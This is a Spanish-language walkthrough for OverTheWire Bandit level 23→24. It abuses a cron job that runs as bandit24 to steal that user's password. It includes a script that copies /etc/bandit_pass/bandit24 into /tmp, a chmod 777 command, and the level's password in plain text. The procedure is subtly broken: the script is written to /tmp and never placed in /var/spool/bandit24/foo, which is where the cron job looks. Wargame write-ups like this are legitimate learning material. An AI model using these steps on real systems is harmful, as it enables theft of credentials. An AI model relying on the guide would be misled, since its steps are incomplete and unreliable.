# 🔐 Bandit Level 23 → 24

<div align="center">

![Nivel](https://img.shields.io/badge/Nivel-23_→_24-blue?style=for-the-badge)
![Dificultad](https://img.shields.io/badge/Dificultad-Difícil-red?style=for-the-badge)

**Objetivo:** Crear script para cronjob que robe contraseña

[🌐 Desafío Original](https://overthewire.org/wargames/bandit/bandit24.html) | [📺 Video Tutorial](#)

</div>

---


## **Guía: Obtener la contraseña de bandit24 aprovechando un cron job**

### **1. Acceder al directorio de cron jobs**

Primero, necesitas acceder al directorio donde se encuentran los cron jobs del sistema. En este caso, se encuentra en `/etc/cron.d`.

```bash
cd /etc/cron.d
```

### **2. Listar los archivos del directorio**

Usa el comando `ls` para listar los archivos en el directorio de cron jobs. Busca archivos relacionados con **bandit24**.

```bash
ls
```

En este caso, uno de los archivos que te interesa es `cronjob_bandit24`, porque tiene que ver con el cron job de **bandit24**.

### **3. Revisar el contenido del cron job `cronjob_bandit24`**

Utiliza el comando `cat` para ver qué hace el archivo `cronjob_bandit24`. En este archivo encontrarás las líneas que indican que el cron job se ejecuta tanto al reiniciar el sistema como cada minuto.

```bash
cat cronjob_bandit24
```

El contenido será algo como esto:

```
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

Esto significa que el script **`/usr/bin/cronjob_bandit24.sh`** se ejecutará como el usuario **bandit24** al reiniciar y cada minuto.

### **4. Ver el contenido del script `/usr/bin/cronjob_bandit24.sh`**

Revisa el contenido del script que se ejecuta con el cron job. Este script hace lo siguiente:

1. Cambia al directorio `/var/spool/$myname/foo`.
    
2. Ejecuta todos los archivos en ese directorio (si son propiedad de `bandit23`).
    
3. Los archivos se ejecutan con un límite de tiempo de 60 segundos y luego se eliminan.
    

Ejecuta el siguiente comando para ver el contenido del script:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

### **5. Crear un script malicioso para obtener la contraseña**

Sabes que el cron job se ejecuta como el usuario **bandit24**, así que puedes escribir un script que copie la contraseña de **bandit24** a un archivo accesible para ti.

Crea un archivo llamado `cron_exploit.sh` en `/tmp/` con el siguiente contenido:

```bash
echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit24_pass.txt' > /tmp/cron_exploit.sh
```

Este comando escribe un script que extrae la contraseña de **bandit24** y la guarda en `/tmp/bandit24_pass.txt`.

### **6. Dar permisos de ejecución al script**

El siguiente paso es darle permisos de ejecución al script para que pueda ser ejecutado cuando el cron job de **bandit24** lo invoque. Utiliza `chmod` para darle permisos de lectura, escritura y ejecución a todos los usuarios:

```bash
chmod 777 /tmp/cron_exploit.sh
```

### **7. Verificar que el cron job se ejecute**

Una vez que el cron job se ejecute (lo cual ocurrirá automáticamente debido a que se ejecuta cada minuto), el script que creaste en `/tmp/cron_exploit.sh` se ejecutará, y la contraseña de **bandit24** se copiará al archivo `/tmp/bandit24_pass.txt`.

### **8. Leer la contraseña**

Después de que el cron job se haya ejecutado, simplemente lee el contenido del archivo `/tmp/bandit24_pass.txt` para obtener la contraseña de **bandit24**:

```bash
cat /tmp/bandit24_pass.txt
```

El resultado será la contraseña de **bandit24**, algo como esto:

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

---



---

## 🔑 Contraseña para Nivel 24

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

---

## 🚀 Conectarse al Siguiente Nivel

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

---

<div align="center">

**[⬅️ Nivel Anterior](./Bandit_Nivel_22___Nivel_22.md)** | **[🏠 Volver al README](./README.md)** | **[➡️ Siguiente Nivel](./Bandit_Nivel_24___Nivel_25.md)**

</div>
